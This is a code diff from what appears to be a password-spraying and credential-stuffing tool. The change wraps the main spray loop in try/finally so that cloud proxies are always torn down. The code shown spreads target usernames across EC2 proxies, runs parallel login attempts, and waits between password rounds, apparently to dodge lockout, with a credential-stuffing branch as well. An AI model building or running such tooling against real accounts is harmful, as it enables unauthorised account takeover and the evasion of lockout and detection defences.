@@ -73,49 +73,51 @@ def main():
 
     results = []
 
-    # Perform credential stuffing, if that's what's in store:
-    if not args.passwords and ":" in args.usernames[1]:
-        utils.credential_stuffing(spray_config, args, proxies)
-    else:
+    try:
+        # Perform credential stuffing, if that's what's in store:
+        if not args.passwords and ":" in args.usernames[1]:
+            utils.credential_stuffing(spray_config, args, proxies)
+        else:
 
-    # Loop through passwords
-        password_id = 0
-        while password_id < len(args.passwords):
-            next_start_time = datetime.now() + timedelta(minutes=args.delay)  # Check when the next spray should run
+        # Loop through passwords
+            password_id = 0
+            while password_id < len(args.passwords):
+                next_start_time = datetime.now() + timedelta(minutes=args.delay)  # Check when the next spray should run
 
-            print(f"Beginning spray with password '{args.passwords[password_id]}'")
+                print(f"Beginning spray with password '{args.passwords[password_id]}'")
 
-            # Split users among proxies
-            chunk_size = (len(args.usernames) + len(proxies) - 1) // len(proxies)
-            user_chunks = [args.usernames[i:i + chunk_size] for i in range(0, len(args.usernames), chunk_size)]
+                # Split users among proxies
+                chunk_size = (len(args.usernames) + len(proxies) - 1) // len(proxies)
+                user_chunks = [args.usernames[i:i + chunk_size] for i in range(0, len(args.usernames), chunk_size)]
 
-            processes = []
-            queue = Queue()
-            for proxy, user_chunk in zip(proxies, user_chunks):
-                credentials = [{'USERNAME': username, 'PASSWORD': args.passwords[password_id]} for username in
-                               user_chunk]
-                p = Process(target=utils.perform_spray, args=(spray_config, credentials, proxy, queue))
-                p.start()
-                processes.append(p)
+                processes = []
+                queue = Queue()
+                for proxy, user_chunk in zip(proxies, user_chunks):
+                    credentials = [{'USERNAME': username, 'PASSWORD': args.passwords[password_id]} for username in
+                                   user_chunk]
+                    p = Process(target=utils.perform_spray, args=(spray_config, credentials, proxy, queue))
+                    p.start()
+                    processes.append(p)
 
-            for p in processes:
-                p.join()
+                for p in processes:
+                    p.join()
 
-            # Gather all results
-            while not queue.empty():
-                results.extend(queue.get())
+                # Gather all results
+                while not queue.empty():
+                    results.extend(queue.get())
 
-            # Check to see if the process is at the end. If not, wait the specified time.
-            password_id += 1
-            if password_id < len(args.passwords):
-                print(f"Spray of password '{args.passwords[(password_id - 1)]}' complete. Waiting until "
-                      f"{next_start_time.strftime('%H:%M')} to start next spray.")
-                pause.until(next_start_time)
-            else:
-                print(f"Spray of password '{args.passwords[password_id - 1]}' complete. All passwords complete.")
+                # Check to see if the process is at the end. If not, wait the specified time.
+                password_id += 1
+                if password_id < len(args.passwords):
+                    print(f"Spray of password '{args.passwords[(password_id - 1)]}' complete. Waiting until "
+                          f"{next_start_time.strftime('%H:%M')} to start next spray.")
+                    pause.until(next_start_time)
+                else:
+                    print(f"Spray of password '{args.passwords[password_id - 1]}' complete. All passwords complete.")
 
-    utils.destroy_proxies(args, ec2)
-    utils.print_ending(results)
+    finally:
+        utils.destroy_proxies(args, ec2)
+        utils.print_ending(results)
 
 
 # --------------------------------- #
